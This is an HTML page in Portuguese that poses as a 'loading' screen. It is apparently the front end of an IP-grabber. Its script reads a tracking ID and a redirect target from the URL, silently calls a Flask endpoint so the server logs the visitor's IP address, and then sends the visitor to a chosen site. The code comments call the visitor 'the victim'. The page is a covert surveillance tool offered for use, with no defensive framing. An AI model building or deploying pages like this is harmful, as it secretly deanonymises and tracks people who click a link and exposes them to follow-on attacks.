<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-size: 1.2em;
        }
        .loading-text {
            animation: blink 1s step-start infinite;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="loading-text">Aguarde, carregando o recurso...</div>

    <script>
        // URL da sua API no Flask (DEVE SER A MESMA DO SEU CÓDIGO PYTHON)
        const API_URL = "http://localhost:5000/capture-ip";
        
        // Função para obter parâmetros da URL (como track_id e redirect)
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            // Usa decodeURIComponent para decodificar o link de destino
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        };

        // 1. Obtém o ID de Rastreio
        const trackId = getUrlParameter('track_id');
        
        // 2. Obtém a URL de Destino Dinâmica
        const dynamicRedirectUrl = getUrlParameter('redirect');

        // Define uma URL de fallback segura (caso o parâmetro 'redirect' não seja encontrado)
        // Se der algum erro, a vítima será enviada para o Google.
        const FINAL_REDIRECT_URL = dynamicRedirectUrl || "https://google.com";

        // 3. Função principal para capturar e redirecionar
        function captureIP() {
            if (!trackId) {
                // Se não houver track_id (a vítima acessou diretamente), apenas redireciona
                window.location.href = FINAL_REDIRECT_URL;
                return;
            }

            // A requisição GET simples envia o IP e o track_id para o seu servidor Flask.
            // O IP real do cliente é capturado no cabeçalho pelo servidor.
            fetch(`${API_URL}?track_id=${trackId}`)
                .then(response => {
                    // Após a tentativa de envio (sucesso ou falha), redireciona imediatamente
                    console.log("Tentativa de envio de IP para o servidor concluída.");
                })
                .catch(error => {
                    console.error("Erro no fetch, mas continua com o redirecionamento:", error);
                })
                .finally(() => {
                    // Redirecionamento FINAL e dinâmico para a URL escolhida no comando
                    window.location.href = FINAL_REDIRECT_URL;
                });
        }

        // Inicia o processo de captura
        captureIP();
    </script>
</body>
</html>
